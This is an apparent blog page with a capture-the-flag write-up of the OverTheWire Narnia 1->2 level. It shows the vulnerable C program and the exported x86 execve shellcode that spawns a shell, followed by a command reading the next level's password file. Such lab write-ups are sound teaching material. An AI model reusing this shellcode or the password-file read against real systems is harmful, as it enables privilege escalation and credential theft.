<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!">
    <meta name="author" content="W3ndige">
    <title>Overthewire.org - Narnia 1 -> 2 - Root Network Security</title>

    <link rel="canonical" href="http://localhost:4000/2017/02/02/overthewire.org-narnia-2/">
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/clean-blog.css">

    <!-- Pygments Github CSS -->
    <link rel="stylesheet" href="/css/syntax.css">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="//https://fonts.googleapis.com/css?family=Nunito:400,700i" rel="stylesheet">
    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->


    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Root Network Security" />

</head>


<body>

    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">Root Network Security</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                <li>
                    <a href="/about/">About</a>
                </li>

                <li>
                    <a href="/archive/">Archive</a>
                </li>

                <li>
                    <a href="/contact/">Contact</a>
                </li>

                <li>
                    <a href="/projects/">Projects</a>
                </li>

                <li>
                    <a href="/resources/">Resources</a>
                </li>
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>


    <!-- Post Header -->
<header class="intro-header" style="background-image: url('/img/overthewire-header.png')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>Overthewire.org - Narnia 1 -> 2</h1>
                    
                    <h2 class="subheading">Write-Up</h2>
                    
                    <span class="meta">Posted by W3ndige on February 2, 2017</span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">

				<h1>Introduction</h1>
<p>Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!</p>

<h1>Challenge</h1>

<p>Firstly let's take a look at the code of the program. </p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>

	<span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">"EGG"</span><span class="p">)</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>    
		<span class="n">printf</span><span class="p">(</span><span class="s">"Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"Trying to execute EGG!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"EGG"</span><span class="p">);</span>
	<span class="n">ret</span><span class="p">();</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>The first thing that I see is that this program will check, whether or not the value of EGG variable is empty, if yes, it will print the message. But if not, it will try to execute it. </p>

<p>But what is enviromental variable? </p>

<p>Every time shell session is started, process is gathering information that should be available to the shell process and all child processes, putting them in special area called <b>enviroment</b>. </p>

<p><b>Enviromental variables</b> provide a way to influence the behaviour of software on the system. For example, the "LANG" environment variable determines the language in which software programs communicate with the user. They are represented as an key-value pairs. </p>

<pre>
KEY=VALUE
KEY=VALUE1:VALUE2
KEY="VALUE WITH SPACES"
</pre>

<p>Now when we understand the topic, let's try to set EGG variable as some random text possibly causing the program to crash. </p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">narnia1@melinda:/narnia$ </span><span class="nb">export</span> <span class="s2">"EGG"</span><span class="o">=</span><span class="s2">"completelyrandomtext"</span>
<span class="gp">narnia1@melinda:/narnia$ </span>./narnia1
Trying to execute EGG!
Segmentation fault</code></pre></figure>

<p>Yes! Now let's try and find some x86 shellcode that will be executed by the program. What I found working, was this <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">shellcode</a>, which was actually second one I've tried - the first one didn't want to cooperate ;)</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">narnia1@melinda:/narnia$ </span><span class="nb">export</span> <span class="s2">"EGG"</span><span class="o">=</span><span class="nv">$'</span><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>89<span class="se">\x</span>c1<span class="se">\x</span>89<span class="se">\x</span>c2<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>40<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="s1">'
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2</span></code></pre></figure>

<p>We have the password to the next level! </p>

<h1>Conclusion</h1>

<p>It was another great challenge from <a href="www.overthewire.org">OverTheWire</a>. I'm looking forward to the next one, maybe something a little bit harder? We'll see!</p>

<p><b>UPDATE</b></p>
<p>To gain better insight into who visits my website, I decided to add Piwik Analytics as a way to both give me essential information, and to repsect your privacy. You can read more at the <a href="/privacy/">Privacy Policy</a>, but if you still have any questions, contact me and I'll try my best to answer. </p>

<p>~ Stay safe!</p>


                <hr>

                <ul class="pager">
                    
                    <li class="previous">
                        <a href="/2017/01/01/overthewire.org-narnia-1/" data-toggle="tooltip" data-placement="top" title="Overthewire.org - Narnia 0 -> 1">&larr; Previous Post</a>
                    </li>
                    
                    
                    <li class="next">
                        <a href="/2017/02/03/overthewire.org-narnia-3/" data-toggle="tooltip" data-placement="top" title="Overthewire.org - Narnia 2 -> 3">Next Post &rarr;</a>
                    </li>
                    
                </ul>

            </div>
        </div>
    </div>
</article>

<hr>


    <!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    <li>
                        <a href="/feed.xml">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    <li>
                        <a href="https://github.com/w3ndige">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li>
                        <a href="mailto:w3ndige@protonmail.com">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
                <p class="copyright text-muted">Copyright &copy; RootNetSec 2016 - 2017</p>
            </div>
        </div>
    </div>
</footer>

<!-- jQuery -->
<script src="/js/jquery.min.js "></script>

<!-- Bootstrap Core JavaScript -->
<script src="/js/bootstrap.min.js "></script>

<!-- Custom Theme JavaScript -->
<script src="/js/clean-blog.min.js "></script>


</body>

</html>
